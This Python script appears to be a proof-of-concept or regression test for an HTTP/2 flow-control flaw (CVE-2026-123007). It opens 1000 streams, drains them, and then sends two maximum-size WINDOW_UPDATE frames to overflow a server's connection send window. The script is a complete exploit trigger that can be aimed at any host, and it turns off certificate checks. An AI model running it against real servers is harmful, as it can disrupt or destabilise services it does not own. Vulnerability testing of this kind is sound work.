#!/usr/bin/env python3
"""CVE-2026-123007 stage A: connection send_window overflows past MAX.

Client sets INITIAL_WINDOW_SIZE=MAX, opens 1000 streams so HEADERS pile up
behind a tiny socket, drains (HEADERS leave => send_queued drifts negative),
then sends two full-size WINDOW_UPDATE frames.  The second one is only legal
because of the drift, so a correct build must reject it.

Self-contained: uses the vendored h2/hpack/hyperframe in ./_vendor.
"""
import os
import socket
import ssl
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "_vendor"))

import h2.config  # noqa: E402
import h2.connection  # noqa: E402

HOST = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 18443
N = int(sys.argv[1]) if len(sys.argv) > 1 else 1000
MAX = 2 ** 31 - 1

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(["h2"])
s = ctx.wrap_socket(socket.create_connection((HOST, PORT)), server_hostname="localhost")
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024)

c = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
c.initiate_connection()
c.update_settings({h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: MAX,
                   h2.settings.SettingCodes.MAX_CONCURRENT_STREAMS: 5000})
s.sendall(c.data_to_send())

H = lambda: [(b":method", b"GET"), (b":path", b"/big.bin"),
             (b":scheme", b"https"), (b":authority", b"localhost")]


def wu(inc, sid=0):
    return bytes([0, 0, 4, 0x8, 0]) + sid.to_bytes(4, "big") + inc.to_bytes(4, "big")


for i in range(N):
    c.send_headers(3 + 2 * i, H(), end_stream=True)
s.sendall(c.data_to_send())

# drain: the HEADERS frames actually leave, so send_queued drifts negative
s.settimeout(0.2)
end = time.time() + 5
while time.time() < end:
    try:
        if not s.recv(65536):
            break
    except Exception:
        pass
print("drained")

# 1) push the window to its legal maximum, 2) one more full increment
try:
    s.sendall(wu(MAX - 65535))
except Exception as e:
    print("wu1 err", type(e).__name__)
print("wu1 sent")
time.sleep(0.4)

try:
    s.sendall(wu(MAX - 65535))
except Exception as e:
    print("wu2 err", type(e).__name__)
print("wu2 sent")
time.sleep(0.6)

try:
    s.settimeout(1.5)
    d = s.recv(65536)
    print("recv", len(d))
except Exception as e:
    print("recv err", type(e).__name__)
